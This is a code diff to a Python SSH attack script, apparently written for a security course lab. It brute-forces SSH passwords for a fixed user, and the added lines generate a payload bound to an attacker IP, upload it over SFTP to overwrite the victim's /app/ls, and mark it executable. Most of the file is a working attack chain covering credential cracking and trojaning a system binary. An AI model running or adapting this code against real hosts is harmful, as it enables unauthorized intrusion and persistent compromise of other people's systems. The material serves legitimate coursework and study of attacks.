@@ -1,11 +1,14 @@
 #!/usr/bin/python3
 
+from paramiko.client import SSHClient
+
 import itertools
 import paramiko
 import logging
 import socket
 import time
 import sys
+import os
 
 logging.getLogger('paramiko.transport').addHandler(logging.NullHandler())
 
@@ -29,26 +32,26 @@ def generate_combinations(ifname: str = "victim.dat", ofname: str = "combination
     ofd.close()
     return 0
 
-def connect_ssh(hostname: str = "victim", username: str = "csc2024", password: str = "", depth: int = 0) -> int:
+def connect_ssh(hostname: str = "victim", username: str = "csc2024", password: str = "", depth: int = 0) -> (int, SSHClient):
     if password == "":
         print("[!] Password is required")
-        return 1
+        return (1, None)
     prefix = ""
     if depth > 0:
         prefix = "\n"
     ssh_client = paramiko.SSHClient()
     ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     try:
-        ssh_client.connect(hostname=hostname, username=username, password=password, timeout=1)
+        ssh_client.connect(hostname=hostname, username=username, password=password, timeout=0.2)
     except socket.timeout:
         print(f"{prefix}[!] Host: {hostname} is unreachable, timed out.")
-        return 2
+        return (2, None)
     except paramiko.AuthenticationException:
         print(f"{prefix}[!] Invalid credentials for {username}:{password}")
-        return 3
+        return (3, None)
     except (paramiko.SSHException, EOFError, paramiko.ssh_exception.SSHException):
         if depth == 0:
-            print(f"[*] Quota exceeded, retrying with delay", end="")
+            print(f"[*] Quota exceeded, retrying after delay", end="")
         else:
             print(".", end="")
         # sleep for a minute
@@ -58,19 +61,19 @@ def connect_ssh(hostname: str = "victim", username: str = "csc2024", password: s
     else:
         # connection was established successfully
         print(f"{prefix}[+] Found combo:\n\tHOSTNAME: {hostname}\n\tUSERNAME: {username}\n\tPASSWORD: {password}")
-    return 0
+    return (0, ssh_client)
 
-def crack_ssh(target_hostname: str = "victim", ifname: str = "combination.txt") -> (int, str, str):
+def crack_ssh(target_hostname: str = "victim", ifname: str = "combination.txt") -> (int, SSHClient):
     # read combinations from file
     # crack ssh using the string in the file
     username = "csc2024"
     ret = 0
     with open(ifname, "r") as fd:
         for line in fd:
-            ret = connect_ssh(hostname=target_hostname, username=username, password=line.strip())
+            (ret, ssh_client) = connect_ssh(hostname=target_hostname, username=username, password=line.strip())
             if ret == 0:
-                return (0, username, line.strip())
-    return (1, "", "")
+                return (0, ssh_client)
+    return (1, None)
 
 def parse_arguments() -> tuple:
     if len(sys.argv) < 3:
@@ -83,14 +86,29 @@ def parse_arguments() -> tuple:
         exit(1)
     return (sys.argv[1], sys.argv[2], attacker_port)
 
+def generate_payload(infect_target: str = "ls", output_target: str = "new_ls", attacker_ip: str = "attacker"):
+    os.system(f"./make_payload {infect_target} {output_target} {attacker_ip}")
+
+def put_file_to_victim(client):
+    print("[+] Infecting victim's ls")
+    client_sftp = client.open_sftp()
+    local_file = "./new_ls"
+    remote_path = "/app/ls"
+    client_sftp.put(local_file, remote_path)
+    client_sftp.close()
+    client.exec_command(f"chmod +x {remote_path}")
+    print("[+] Infection done")
+
 def main():
-    victim_ip, attack_ip, attacker_port = parse_arguments()
+    victim_ip, attacker_ip, attacker_port = parse_arguments()
     generate_combinations()
-    ret_val, username, password = crack_ssh(target_hostname=victim_ip)
+    ret_val, ssh_client = crack_ssh(target_hostname=victim_ip)
     if ret_val == 1:
         print("[*] No valid credential found in the dictionary")
         return 0
-
+    generate_payload(attacker_ip=attacker_ip)
+    put_file_to_victim(ssh_client)
+    print("[+] Exit gracefully")
 
 if __name__ == "__main__":
     main()
